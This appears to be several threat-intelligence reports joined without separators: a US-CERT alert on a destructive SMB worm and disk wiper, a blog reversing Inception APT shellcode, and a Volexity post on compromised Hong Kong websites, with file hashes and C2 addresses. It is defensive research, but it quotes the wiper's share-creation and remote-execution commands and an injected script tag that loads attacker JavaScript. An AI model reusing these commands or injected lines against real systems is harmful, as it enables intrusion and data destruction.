Trojan : W64/Gh0stMiancha MD5 1d2c77f0f8a715de09ce6fae5fc800d4 SHA1 30784735763b060a39f76c29439a6aebbf6a4b9b SHA256 2fdf454f6b1c82d757d054bea5f0438f5da1ecd9e5059610d3d4b74e75a7c8b0 Size ( bytes ) 233019 Compile Time 2013-12-06 08:10:34 UTC In-the-wild Filenames N/A PDB String C : \Users\why\Desktop\server ( update.dll ) ( instructions.pdf ) x64\x64\Release\server.pdb .
TLP : WHITE Page 10 / 11 .
TLP : WHITE .
Context Information Security Threat Intelligence threat @ contextis.co.uk London ( HQ ) Cheltenham Düsseldorf Melbourne 4th Floor Corinth House 1.OG 4th Floor 30 Marsh Wall 117 Bath Road Adersstrcontextis.co.ukation Security Threat Intelligence threat @ contextis.co.uk London ( HQ ) Cheltenham Düsseldorf Melbourne 4th Floor Corinth House 1.OG 4th Floor 30 Marsh Wall 117 Bath Road Adersstr .
28 155 Queen Street London E14 9TP Cheltenham GL53 7LS 40215 Düsseldorf Melbourne VIC 3000 United Kingdom United Kingdom Germany Australia .
TLP : WHITE Page 11 / 11 .
Alert ( TA14-353A ) Targeted Destructive Malware .
Original release date : December 19 , 2014 .
Systems Affected .
Microsoft Windows .
Overview .
US-CERT was recently notified by a trusted third party of cyber threat actors using a Server Message Block ( SMB ) Worm Tool to conduct cyber exploitation activities recently targeting a major entertainment company .
This SMB Worm Tool is equipped with a Listening Implant , Lightweight Backdoor , Proxy Tool , Destructive Hard Drive Tool , and Destructive Target Cleaning Tool .
SMB Worm Tool : This worm uses a brute force authentication attack to propagate via Windows SMB shares .
It connects home every five minutes to send log data back to command and control ( C2 ) infrastructure if it has successfully spread to other Windows hosts via SMB port 445 .
The tool also accepts new scan tasking when it connects to C2 .
There are two main threads : the first thread calls home and sends back logs ( a list of successful SMB exploitations ) , and the second thread attempts to guess passwords for SMB connections .
If the password is correctly guessed , a file share is established and file is copied and run on the newly-infected host .
Listening Implant : During installation of this tool , a portion of the binaries is decrypted using AES , with a key derived from the phrase `` National Football League . '' Additionally , this implant listens for connections on TCP port 195 ( for `` sensvc.exe '' and `` msensvc.exe '' ) and TCP port 444 ( for `` netcfg.dll '' ) .
Each message sent to and from this implant is preceded with its length , then XOR encoded with the byte 0x1F .
Upon initial connection , the victim sends the string , `` HTTP/1.1 GET /dns ? \x00 . '' The controller then responds with the string `` 200 www.yahoo.com ! \x00 '' ( for `` sensvc.exe '' and `` msensvc.exe '' ) or with the string `` RESPONSE 200 OK ! ! '' ( for `` netcfg.dll '' ) .
The controller sends the byte `` ! '' ( 0x21 ) to end the network connection .
This special message is not preceded with a length or XOR encoded .
Lightweight Backdoor : This is a backdoor listener that is designed as a service DLL .
It includes functionality such as file transfer , system survey , process manipulation , file time matching and proxy capability .
The listener can also perform arbitrary code execution and execute commands on the command line .
This tool includes functionality to open ports in a victim host 's firewall and take advantage of universal Plug and Play ( UPNP ) mechanisms to discover routers and gateway devices , and add port mappings , allowing inbound connections to victim hosts on Network Address Translated ( NAT ) private networks .
There are no callback domains associated with this malware since connections are inbound only on a specified port number .
Proxy Tool : Implants in this malware family are typically loaded via a dropper installed as a service , then configured to listen on TCP port 443 .
The implant may have an associated configuration file which can contain a configurable port .
This proxy tool has basic backdoor functionality , including the ability to fingerprint the victim machine , run remote commands , perform directory listings , perform process listings , and transfer files .
Destructive Hard Drive Tool : This tool is a tailored hard-drive wiping tool that is intended to destroy data past the point of recovery and to complicate the victim machine ’ s recovery .
If the CNE operator has administrator-level privileges on the host , the program will over-write portions of up-to the first four physical drives attached , and over-write the master boot record ( MBR ) with a program designed to cause further damage if the hard drive is re-booted .
This further results in the victim machine being non-operational with irrecoverable data .
( There is a caveat for machines installed with the windows 7 operating system : windows 7 machines will continue to operate in a degraded state with the targeted files destroyed until after reboot , in which the infected MBR then wipes the drive . ) If the actor has user-level access , the result includes specific files being deleted and practically irrecoverable , but the victim machine would remain usable .
Destructive Target Cleaning Tool : This tool renders victim machines inoperable by overwriting the Master Boot Record .
The tool is dropped and installed by another executable and consists of three parts : an executable and a dll which contain the destructive components , and an encoded command file that contains the actual destruction commands to be executed .
Network Propagation Wiper : The malware has the ability to propagate throughout the target network via built-in Windows shares .
Based on the username/password provided in the configuration file and the hostname/IP address of target systems , the malware will access remote network shares in order to upload a copy of the wiper and begin the wiping process on these remote systems .
The malware uses several methods to access shares on the remote systems to begin wiping files .
Checking for existing shares via “ \\hostname\admin $ \system32 ” and “ \\hostname\shared $ \system32 ” or create a new share “ cmd.exe /q /c net share shared $ = % SystemRoot % /GRANT : everyone , FULL ” .
Once successful , the malware uploads a copy of the wiper file “ taskhostXX.exe ” , changes the file-time to match that of the built-in file “ calc.exe ” , and starts the remote process .
The remote process is started via the command “ cmd.exe /c wmic.exe /node : hostname /user : username /password : pass PROCESS CALL CREATE ” .
Hostname , username , and password are then obtained from the configuration file .
Afterwards , the remote network share is removed via “ cmd.exe /q /c net share shared $ /delete ” .
Once the wiper has been uploaded , the malware reports its status back to one of the four C2 IP addresses .
Technical and strategic mitigation recommendations are included in the Solution section below .
US-CERT recommends reviewing the Security Tip Handling Destructive Malware # ST13-003 .
Description .
Cyber threat actors are using an SMB worm to conduct cyber exploitation activities .
This tool contains five components – a listening implant , lightweight backdoor , proxy tool , destructive hard drive tool , and destructive target cleaning tool .
The SMB worm propagates throughout an infected network via brute-force authentication attacks , and connects to a C2 infrastructure .
Impact .
Due to the highly destructive functionality of this malware , an organization infected could experience operational impacts including loss of intellectual property and disruption of critical systems .
Solution .
Users and administrators are recommended to take the following preventive measures to protect their computer networks : Use and maintain anti-virus software – Anti-virus software recognizes and protects your computer against most known viruses .
It is important to keep your anti-virus software up-to-date ( see Understanding Anti-Virus Software for more information ) .
Keep your operating system and application software up-to-date – Install software patches so that attackers ca n't take advantage of known problems or vulnerabilities .
Many operating systems offer automatic updates .
If this option is available , you should enable it ( see Understanding Patches for more information ) .
Review Security Tip Handling Destructive Malware # ST13-003 and evaluate their capabilities encompassing planning , preparation , detection , and response for such an event .
Review Recommended Practices for Control Systems , and Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies ( pdf ) .
The following is a list of the Indicators of Compromise ( IOCs ) that can be added to network security solutions to determine whether they are present on a network .
MD5s : SMB worm tool : MD5 : f6f48551d7723d87daeef2e840ae008f Characterization : File Hash Watchlist Notes : `` SMB worm tool '' Earliest PE compile Time : 20141001T072107Z Most Recent PE compile Time : 20141001T072107Z MD5 : 194ae075bf53aa4c83e175d4fa1b9d89 Characterization : File Hash Watchlist Notes : `` SMB worm tool '' Earliest PE compile Time : 20141001T120954Z Most Recent PE compile Time : 20141001T142138Z Lightweight backdoor : MD5 : f57e6156907dc0f6f4c9e2c5a792df48 Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20110411T225224Z Latest PE compile time : 20110411T225224Z MD5 : 838e57492f632da79dcd5aa47b23f8a9 Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20110517T050015Z Latest PE compile time : 20110605T204508Z MD5 : 11c9374cea03c3b2ca190b9a0fd2816b Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20110729T062417Z Latest PE compile time : 20110729T062958Z MD5 : 7fb0441a08690d4530d2275d4d7eb351 Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20120128T071327Z Latest PE compile time : 20120128T071327Z MD5 : 7759c7d2c6d49c8b0591a3a7270a44da Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20120309T105837Z Latest PE compile time : 20120309T105837Z MD5 : 7e48d5ba6e6314c46550ad226f2b3c67 Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20120311T090329Z Latest PE compile time : 20120311T090329Z MD5 : 0a87c6f29f34a09acecce7f516cc7fdb Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20120325T053138Z Latest PE compile time : 20130513T090422Z MD5 : 25fb1e131f282fa25a4b0dec6007a0ce Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20130802T054822Z Latest PE compile time : 20130802T054822Z MD5 : 9761dd113e7e6673b94ab4b3ad552086 Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20130913T013016Z Latest PE compile time : 20130913T013016Z MD5 : c905a30badb458655009799b1274205c Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20140205T090906Z Latest PE compile time : 20140205T090906Z MD5 : 40adcd738c5bdc5e1cc3ab9a48b3df39 Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20140320T152637Z Latest PE compile time : 20140402T023748Z MD5 : 68a26b8eaf2011f16a58e4554ea576a1 Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20140321T014949Z Latest PE compile time : 20140321T014949Z MD5 : 74982cd1f3be3d0acfb0e6df22dbcd67 Characterization : File Hash Watchlist Notes : `` Lightweight backdoor '' Earliest PE compile time : 20140506T020330Z Latest PE compile time : 20140506T020330Z Proxy tool : MD5 : 734740b16053ccc555686814a93dfbeb Characterization : File Hash Watchlist Notes : `` Proxy tool '' Earliest PE compile time : 20140611T064905Z Latest PE compile time : 20140611T064905Z MD5 : 3b9da603992d8001c1322474aac25f87 Characterization : File Hash Watchlist Notes : `` Proxy tool '' Earliest PE compile time : 20140617T035143Z Latest PE compile time : 20140617T035143Z MD5 : e509881b34a86a4e2b24449cf386af6a Characterization : File Hash Watchlist Notes : `` Proxy tool '' Earliest PE compile time : 20140618T064527Z Latest PE compile time : 20140618T064527Z MD5 : 9ab7f2bf638c9d911c2c742a574db89e Characterization : File Hash Watchlist Notes : `` Proxy tool '' Earliest PE compile time : 20140724T011233Z Latest PE compile time : 20140724T011233Z MD5 : a565e8c853b8325ad98f1fac9c40fb88 Characterization : File Hash Watchlist Notes : `` Proxy tool '' Earliest PE compile time : 20140724T065031Z Latest PE compile time : 20140902T135050Z MD5 : 0bb82def661dd013a1866f779b455cf3 Characterization : File Hash Watchlist Notes : `` Proxy tool '' Earliest PE compile time : 20140819T024812Z Latest PE compile time : 20140819T024812Z MD5 : b8ffff8b57586d24e1e65cd0b0ad9173 Characterization : File Hash Watchlist Notes : `` Proxy tool '' Earliest PE compile time : 20140902T172442Z Latest PE compile time : 20140902T172442Z MD5 : 4ef0ad7ad4fe3ef4fb3db02cd82bface Characterization : File Hash Watchlist Notes : `` Proxy tool '' Earliest PE compile time : 20141024T134136Z Latest PE compile time : 20141024T134136Z MD5 : eb435e86604abced7c4a2b11c4637a52 Characterization : File Hash Watchlist Notes : `` Proxy tool '' Earliest PE compile time : 20140526T010925Z Latest PE compile time : 20140526T010925Z MD5 : ed7a9c6d9fc664afe2de2dd165a9338c Characterization : File Hash Watchlist Notes : `` Proxy tool '' Earliest PE compile time : 20140611T064904Z Destructive hard drive tool : MD5 : 8dec36d7f5e6cbd5e06775771351c54e Characterization : File Hash Watchlist Notes : `` Destructive hard drive tool '' Earliest PE compile time : 20120507T151820Z Latest PE compile time : 20120507T151820Z MD5 : a385900a36cad1c6a2022f31e8aca9f7 Characterization : File Hash Watchlist Notes : `` Destructive target cleaning tool '' Earliest PE compile time : 20130318T003315Z Latest PE compile time : 20130318T003315Z MD5 : 7bea4323807f7e8cf53776e24cbd71f1 Characterization : File Hash Watchlist Notes : `` Destructive target cleaning tool '' Earliest PE compile time : 20130318T003319Z Latest PE compile time : 20130318T003319Z Name : d1c27ee7ce18675974edf42d4eea25c6 .bin Size : 268579 bytes ( 268.6 KB ) MD5 : D1C27EE7CE18675974EDF42D4EEA25C6 PE Compile Time : 2014-11-22 00:06:54 .
The malware has the following characteristics : While the original filename of this file is unknown , it was likely “ diskpartmg16.exe ” .
This file serves as a dropper .
It drops destructive malware : “ igfxtrayex.exe ” .
When the dropper file was executed , it started a second instance of itself with “ -i ” as an argument , and then terminated .
The second instance of the dropper file installed itself as the “ WinsSchMgmt ” service with “ -k ” as a command line argument , started the service , and then terminated .
The “ WinsSchMgmt ” service executed the file with “ -k ” as an argument , which started another instance of the file using “ -s ” as an argument .
The “ -s ” instance dropped and executed “ igfxtrayex.exe ” , created “ net_ver.dat ” , and began generating network traffic over TCP ports 445 and 139 to victim IP addresses .
Name : net_ver.dat Size : 4572 bytes ( 4.6 KB ) ( size will vary ) MD5 : 93BC819011B2B3DA8487F964F29EB934 ( hash will vary ) .
This is a log file created by the dropper , and appended to as the scans progress .
It contains what appear to be hostnames , IP addresses , and the number 2 .
Entries in the file have the structure “ HOSTNAME | IP Address | 2 ” .
Name : igfxtrayex.exe Size : 249856 bytes ( 249.9 KB ) MD5 : 760C35A80D758F032D02CF4DB12D3E55 PE Compile Time : 2014-11-24 04:11:08 .
This file is destructive malware : a disk wiper with network beacon capabilities .
If “ igfxtrayex.exe ” is run with no parameters , it creates and starts a copy of itself with the “ –i ” argument .
After 10 minutes , the “ igfxtrayex.exe ” makes three copies of itself and places them in the same directory from which it was executed .
These copies are named according to the format “ taskhostXX.exe ” ( where X is a randomly generated ASCII character ) .
These copies are then executed , each with a different argument ( one being “ -m ” , one being “ -d ” and the other “ -w ” ) .
Network connection attempts are made to one of three hard-coded IP addresses in a random order to port 8080 or 8000 .
If a connection to the IP address can not be made , it attempts to connect to another of the three IP addresses , until connections to all three IP addresses have been attempted .
The following command-line string is then executed : “ cmd.exe /c net stop MSExchangeIS /y ” .
A 120-minute ( 2 hour ) sleep command is issued after which the computer is shut down and rebooted .
Name : iissvr.exe Size : 114688 bytes ( 114.7 KB ) MD5 : E1864A55D5CCB76AF4BF7A0AE16279BA PE Compile Time : 2014-11-13 02:05:35 .
This file , when executed , starts a listener on localhost port 80 .
It has 3 files contained in the resource section ; all xor ’ d with 0x63 .
Name : usbdrv3_32bit.sys Size : 24280 bytes ( 24.3 KB ) MD5 : 6AEAC618E29980B69721158044C2E544 PE Compile Time : 2009-08-21 06:05:32 .
This SYS file is a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000 , XP , 2003 , Vista , 2008 ( 32-bit ) .
It is dropped from resource ID 0x81 of “ igfxtrayex.exe ” .
Name : usbdrv3_64bit.sys Size : 28120 bytes ( 28.1 KB ) MD5 : 86E212B7FC20FC406C692400294073FF PE Compile Time : 2009-08-21 06:05:35 .
This SYS file is a also a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000 , XP , 2003 , Vista , 2008 ( 64-bit ) .
It is dropped from resource ID 0x83 of “ igfxtrayex.exe ” .
Name : igfxtpers.exe Size : 91888 bytes ( 91.9 KB ) MD5 : e904bf93403c0fb08b9683a9e858c73e PE Compile Time : 2014-07-07 08:01:09 .
A summary of the C2 IP addresses :
IP Address Country Port Filename 203.131.222.102 Thailand 8080 Diskpartmg16.exe igfxtrayex.exe igfxtpers.exe 217.96.33.164 Poland 8000 Diskpartmg16.exe igfxtrayex.exe 88.53.215.64 Italy 8000 Diskpartmg16.exe igfxtrayex.exe 200.87.126.116 Bolivia 8000 File 7 58.185.154.99 Singapore 8080 File 7 212.31.102.100 Cypress 8080 File 7 208.105.226.235 United States igfxtpers.exe .
Reversing the Inception APT malware .
After reading the Inception paper by Snorre Fagerland and Waylon Grange , I got curious about this threat and did some reversing .
I felt that it would be good to write a technical blog about the process maybe it could be helpful or interesting for some .
RTF file Analysis MD5 : 4a4874fa5217a8523bf4d1954efb26ef Exploit : CVE-2012-0158 As we can see in following screen shot , this is a RTF [ Rich Text Format ] file .
Its common that attackers use document files such as these as bait .
It is common that shellcode starts with a NOPsled .
In following screenshot we can see that the embedded shellcode starts with NOP slide .
NOP , or No OPeration is a single-byte opcode that does nothing .
It has the hex value of 0x90 .
Embedded Shellcode Analysis First Level .
Now , to the functionality of the shellcode .
We will ignore the first two prolog instructions , and for remaining statements I have inserted comments to help understanding what is happening in this chunk of code .
It ’ s traversing the TEB , the PEB and the Ldr structure to get the base addresses of ntdll.dll and kernel32.dll .
It needs these to find the API addresses it requires for the rest of the infection .
In screenshot below , Function 00120F82 is the malware 's own GetProcAddress function which takes two parameters .
1 .
Base address of the system dll 2 .
Hash of the API name .
The function returns the memory address of the API .
Functionality of function 00120F82 ( GetProcAddress ) .
As shown in the next screenshot , this function parses the “ export name pointer table ” of the .dll [ ex .
kernel32.dll ] and generates a hash for each function .
It compares this with the argument API hash ( Ex DF7D9BAD for GetFileSize , see above screenshot ) using the CMP EDI , ESI instruction .
Once the matching API is found it parses the Export Address Table and returns the respective API address to the caller in EAX register .
The document contains two levels of shellcode .
We are analyzing first level , and in the following code we can see a typical egghunting method : It attempts to open the already opened rtf file by checking file handles in memory .
It starts with a handle with the value 4 and verifies it by doing GetFileSize on it .
If this fails it does ADD ESI,4 again ( adds 4 to the handle ) until the API succeeds .
When this happens it checks the file offset 0x8300 for the marker 0x54405450 .
Again , if this matches up , it allocates memory into which it reads the file content and jumps to the 2nd level shellcode with a JMP EBX .
Second Level Shell Code Analysis .
Now we have landed into the second level shellcode , but it is obfuscated to evade static analysis .
At the initial stage there are few instructions waiting to help us .
This is the deobfuscation code .
We can see that 0x23B * 4 is the number of bytes obfuscated , POP EBX is the get EIP instruction and 0x5687F945 is the deobfuscation XOR key .
In following code we can see the hexadecimal value that corresponds to the library name being pushed to the LoadLibrary function , as well as two loops to get the API addresses using “ CALL 02E203E2 ” function .
Here also it uses hashes to look up APIs .
Hash API Hash API 73E2D87E ExitProcess 0C0397EC GlobalAlloc 7CB922F6 GlobalFree 10FA6516 ReadFile 36EF7370 GetCommandLineA 76DA08AC SetFilePointer 0E8AFE98 WinExec DF7D9BAD GetFileSize E9238AD9 lwrite 6DD38706 CoUninitialize E88A49EA lcreat EB9E05F5 CoSetProxyBlanket 5B8ACA33 GetTempPathA 6E26C880 CoCreateInstance 0FFD97FB CloseHandle 7FC7A3CB CoInitializeEx .
In the following code it searches for the embedded VBS file inside the RTF file in memory .
It checks for the file size in a loop , and if the size is larger than 0x2000 then it sets the file ponter to 0x8C14 to compare with the VBS file marker as we can see in following screenshot .
After finding the VBS marker in memory , it decrypts the VBS file in two iterations .
In the first loop it decrypts and in the second loop it swaps the low and high bytes of the first 0x100 16-bit words , after which it writes the file to a file named “ Temp/ew_Rg.vbs ” .
Payload .VBS file Analysis .
The following screenshot shows a part of the .VBS payload file dropped by .RTF file .
First line is the encrypted .dll 4th line contains Key to decrypt the .dll .
Remaining part is self-explanatory .
The instruction c = Crypt ( c , k ) function decrypts the encrypted dll and returns the decrypted dll .
( See the screenshot above ) c= encrypted dll .
k = decryption key .
Following function writes byte by byte to the dropped.dll file .
Finally , the following code executes the “ regsvr32 ” command to run the wmiprvse.dll in silent mode and sets the run key in registry .
Payload “ wmiprvse.dll ” file Analysis .
This first level of deobfuscation in wmiprvse.dll takes around 3-4 minutes to finish .
Then it allocates memory using VirtualAlloc and writes the unpacked code to newly allocated memory before it jumps to the unpacked code as shown in following screen shot .
This dll has 3 layers of unpacking .
The one above is level one , below iyou can see level two .
We can see the passing of the control to the newly unpacked .dll @ CALL EAX .
It 's very time-consuming to understand the functionality of the dll as it decrypts and builds its own runtime import table to hinder the analysis .
Analyst can not directly see which API gets called .
Finally we can see it ’ s connecting to webdav.cloudme.com and cleartext credentials in following screenshot .
Malware tries to communicate with the user account created at the WebDAV C & C to exfiltrate system and user information .
Reference : https : //www.bluecoat.com/security-blog/2014-12-09/blue-coat-exposes- % E2 % 80 % 9C inception-framework % E2 % 80 % 9D-very-sophisticated-layered-malware .
Democracy in Hong Kong Under Attack .
Posted on October 9 , 2014 by Steven Adair Over the last few months , Volexity has been tracking a particularly remarkable advanced persistent threat ( APT ) operation involving strategic web compromises of websites in Hong Kong and Japan .
In both countries , the compromised websites have been particularly notable for their relevance to current events and the high profile nature of the organizations involved .
In particular the Hong Kong compromises appear to come on the heels of the Occupy Central Campaign shifting into high gear .
These compromises were discovered following the identification of malicious JavaScript that had been added to legitimate code on the impacted websites .
This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install malware on their systems .
While investigating these cases , Volexity also discovered additional APT attack campaigns involving multiple other pro-democratic websites in Hong Kong .
These attempts at exploitation , compromise , and digital surveillance are detailed throughout this post .
Compromised Pro-Democratic Hong Kong Websites .
Warning : Many of these websites may still be compromised and present a risk to visitors .
Browse with caution .
Alliance for True Democracy â€ “ Hong Kong Over the last two days , Volexity has observed malicious code being served up from the website of the Alliance for True Democracy ( ATD ) in Hong Kong ( www.atd.hk ) .
ATD is an alliance of people and organizations dedicated to democracy and universal suffrage in Hong Kong .
At the time of this writing malicious code is still live on the website , so please visit with care until the website is clean .
Below is a screen shot of the malicious code references found pre-pended to a JavaScript file on the website named superfish.js .
This JavaScript file is called from other parts of the website and effectively nests the loading of additional JavaScript written and interpeted as : < script language=javascript src= http://java-se.com/o.js .
The domain name java-se.com is known bad and associated with APT activity .
At the time of this post , the domain is hosted on the Japanese IP address 210.253.101.105 .
7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC .
Volexity has yet to actually see the contents of the file o.js , as the websites has continuously returned HTTP 403 responses each time it was requested .
The file was requested from IP addresses throughout Asia without ever returning valid content .
Itâ€™s unclear if this code is activated at certain times or if there is a whitelist of IPs restricting access to the file to specific targets .
This same code has also been observed being served from another Hong Kong website described in the next section .
Webshell Backdoor .
While examining the ATD website , Volexity also observed that the site had a password protected backdoor webshell placed on it .
This is a fairly popular webshell that Volexity has encountered on several occasions when dealing with website compromises .
Volexity refers to this shell as the Angel Webshell , named after its default password of â€œangelâ€​ .
The shell will simply display the text â€œPassword : â€​ , a text input box , and a Login button .
A screen shot of the webshell as observed on the ATD website can be seen below .
Despite the shell being written in PHP and only displaying a simple Login prompt , it is easy to identify the Angel webshell based on unique components of its viewable HTML source code .
The HTML source of this page is displayed in the following image .
While Volexity operates under the assumption attackers have placed webshells on webservers they have compromised , in this particular instance it can be seen with certainty .
Attackers will often upload new webshells or add simple China Chopper style modifications to legitimate existing files in an attempt to maintain persistence to these systems .
Democratic Party Hong Kong .
In the last week , Volexity also observed both the English and Chinese language websites for the Democratic Party Hong Kong compromised with the same malicious code found ont he ATD website ( www.dphk.org | eng.dphk.org ) .
DPHK is a pro-democracy political party in Hong Kong .
Like the ATD website , at the time of this writing the DPHK websites are also serving up malicious code , so please browse with caution .
During our research for this post , we also became aware of multiple public reports related to the compromise of the DPHK website on both Twitter and via ThreatConnect .
Our good friend Claudio Giurianeri posted the following tweet on October 3 , 2014 The website of the Democratic Party of Hong Kong has been compromised and still is .
Let them know .
# OccupyCentral Diving further into some of the replies to this tweet is a plethora of information regarding the exploit domain java-se.com .
In particular , a tweet from Brandon Dixon with relevant data from the PassiveTotal project details several subdomains and IP addresses associated with java-se.com .
While Volexity has only observed a handful of the hostnames in the wild thus far , other active subdomains suggest there could be additional on-going exploit or malware activity from the domain .
Additional reporting on this activity and another going back to August 2014 was also recently shared on ThreatConnect .
Despite all of this attention , the DPHK website is still compromised and references the JavaScript from the hostile domain .
It is also worth noting that this is not the first time that the DPHK website has been used in a strategic web compromise .
Back in May 2011 , Kaspersky Lab reported the website was being leveraged to target users with Flash Exploits .
The DPHK appears to be of high value with respect to targeting visitors .
People Power â€ “ Hong Kong .
During the course of investigating activity related to the ATD and DPHK websites , Volexity also observed that the website of the political coalition and pan-democratic organization People Power in Hong Kong ( www.peoplepower.hk ) had been compromised as well .
However , unlike the other two websites , the People Power website did not contain JavaScript modifications pointing to java-se.com .
Instead the website appears to have malicious iFrames leveraging the Chinese URL shortener 985.so .
At the bottom of several of the pages for the People Power website are four iFrames as seen in this screen shot of the website source :
Those links , with the exception of the first one , all redirect to exploit pages on the Hong Kong IP address 58.64.178.77 .
URL Meta Refresh Page http://985.so/bUYj N/A ( HTTP 404 ) http://985.so/bUYe http://58.64.178.77:80/SiteLoader http://985.so/b6hW http://58.64.178.77/mPlaye r http://985.so/bUYf http://58.64.178.77:80/0wnersh1p .
These pages load scripts that conduct profiling of the system for various software , plugins , and other related information , as well as load Java exploits designed to install malware on the target system .
If successful , the exploits will install either a 32-bit or 64-bit version of the malware .
Both files are found within the Java Archives files .
Below are details on each of the malware files .
Filename : main.dll File size : 13824 bytes MD5 hash : 1befa2c2d1bfc8e87d52871c868f75fe SHA1 hash : 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817 Notes : 32-bit version of malware , which beacons to 58.64.178.77 :443 .
Filename : main64.dll File size : 15872 bytes MD5 hash : a482a84d13c76b950ce5bc7e75f4edef SHA1 hash : c0a4b9145e0066f5c1534beddc9c666ea8eb0882 Notes : 64-bit version of malware , which beacons to 58.64.178.77 :443 .
At the time of this writing , the People Power website is still serving up malicious code .
Volexity recommends avoiding this website and/or browsing with caution .
Volexity believes a separate group of attackers is responsible for this exploit activity and that they are not affiliated with the java-se.com operations .
The Professional Commons â€ “ Hong Kong .
While digging deeper into pro-democratic websites in Hong Kong , Volexity also discovered peculiar code on the website of a pro democratic and pro-universal suffrage public policy think thank The Professional Commons ( www.procommons.org.hk ) .
In the case of this website , there is suspicious JavaScript code that writes an iFrame pointing back to a non-existent HTML page on a hotel website in South Korea .
The code from the website can be seen in the screen shot below .
The URL in question points to : http://www.hotel365.co.kr/Lnk/tw/index.htm l This link does not work and will redirect a visitor back to the main page of the website .
There does not appear to be any reason for the Professional Commmons website to have a hidden iFrame link randomly placed in the middle of its HTML code .
It is suspected that this was a formerly active exploit URL .
If it is actually malicious , it is possible the code could be re-activated at any time .
Volexity recommend the URL and the Professional Commons website be browsed with caution .
High Profile Compromised Japanese Website .
The Japanese Nikkei .
In early September , the APT group behind java-se.com raised its visibility on Volexityâ€™s radar following a compromise that effectively impacted many components of the Japanese Nikkei .
In the first week of September , a subdomain used to load JavaScript code and additional files onto other Nikkei web properties such as www.nikkei.com and asia.nikkei.com was compromised .
In particular a JavaScript file loaded from parts.nikkei.com was modified to reference another JavaScript file from jre76.java-se.com hosted on the Japanese IP address 211.125.81.203 .
7506 | 211.125.80.0/22 | INTERQ | JP | GMO.JP | GMO INTERNET INC .
The code has since been taken down .
However , in early September the JavaScript was pre-pended to the file http://parts.nikkei.com/parts/SC/s_cDS.js as seen in the screen shot below .
Like the JavaScript from the ATD and DPHK websites , Volexity was never actually able to obtain a live copy of this script .
Each request results in an HTTP 403 response from the server .
Volexity suspects the code was either active at select times and/or was only served to a subset of visitors .
The code has not been observed on the s_cDS.js file for nearly a month now .
Live Exploits , Stolen Certificates , and Signed Malware .
While tracking this APT activity , Volexity has also come across other seemingly unrelated compromises of websites in Hong Kong and Japan associated with the java-se.com activity .
Despite several sites being compromised , the above activity tied to java-se.com did not result in the successful capture of actual exploit code or malware .
However , research into other websites and activity involving java-se.com did lead Volexity to live exploits and malware .
In particular Volexity came across live exploit code hosted at jdk-7u12-windows-i586.java-se.com on the Japanese IP address 210.253.96.200 .
7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC .
This system hosted a JavaScript file , which in turned loads a malicious Java Applet .
In testing the the Java Applet pops up a notification to the user asking them if they want to run the applet .
Volexity has not had enough time to thoroughly analyze the file to see if it is an actual exploit or if the attackers rely on user assisted malware installation .
The pop-up does make it appear as if the file is an update to Java .
The popup displayed by Java is displayed below .
As can be seen in the image above , this popup could be misconstrued by a user as an update to Java despite the java-se.com domain and the Publisher being listed as WindySoft .
Interestingly the Java Archive being loaded is digitally signed by a certificate issued to WindySoft , an online gaming company from South Korea .
We can not confirm this certificate actually belonged to WindySoft at any point in time , however , there is fairly established precedent of certificates from online gaming companies being used to digitally sign malware and attack tools .
PlugX Strikes Again â€ “ Digitally Signed & Using 163.com Blogs .
As one might expect , choosing to press the Run button would be bad news for someone presented with this prompt .
If one were to click Run from this prompt , it would result in the file css.jpg being download over an encrypted channel from a folder on http://elsa-jp.jp .
Note that elsa-jp.jp is a website hosted on the same IP address jdk-7u12-windows-i586.java-se.com and is likely compromised .
The file css.jpg is of course not a JPEG file , it is an executable that has been encoded with the single-byte XOR key 0xFF .
Filename : css.jpg File size : 168776 bytes MD5 hash : b3a9e6548fb3cc511096af4d68b2e745 SHA1 hash : 394703d1240ccd3aaeeef50c212313e3036741b1 Notes : Executable file downloaded by Java Applet that has been encoded with XOR 0Ã—99 Taking a closer look at the resulting executable we have , it turns out it is a newer sample of PlugX .
In this particular sample an interesting and notable string was observed : C : \wocawocawoca\piao\Release\caca.pdb Also of interest is that as observed from the Java Applet , the executable is also digitally signed by a certificate issued to â €œWindySoft.â€​ .
Upon execution the malware sample immediately does a DNS resolution for the following hostname : jduhf873jdu7.blog.163.com The PlugX sample connects to the blog and parses the page for a command for where to connect to next .
This is very similar to the method described by FireEye in their blog on Operation Poisoned Hurricane .
The primary difference being that the attackers opted to use a 163.com Blog over a Google Code page to embed the command .
Taking a closer look at the Blog page the following post is observed :
The primary string to focus on is in the title of the post : DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS Using the same decoding routine describe by Cassidian in a PlugX post of theirs from earlier this year , we can see this command decodes to instruct the malware to connect to a U.S.-based Linode IP address at Hurricane Electric : 173.255.217.77 .
6939 | 173.255.208.0/20 | HURRICANE | US | LINODE.COM | LINODE A look at passive DNS identifies several hostnames that recently resolved to the IP address .
The ones that still resolve to the IP are listed below :
dns.apasms.com ns.gpass1.org ns1.gpass1.org .
These hostnames may be related but at the time of this writing we have not seen them in use in malware and are unable to confirm .
Conclusion .
As we have seen for several years now , dissenting groups , especially those seeking increased levels of freedom frequently find themselves targeted for surveillance and information extraction .
In the digital age , a strategic web compromise ( exploit drive-by ) has become a key weapon of choice for to conduct such operations .
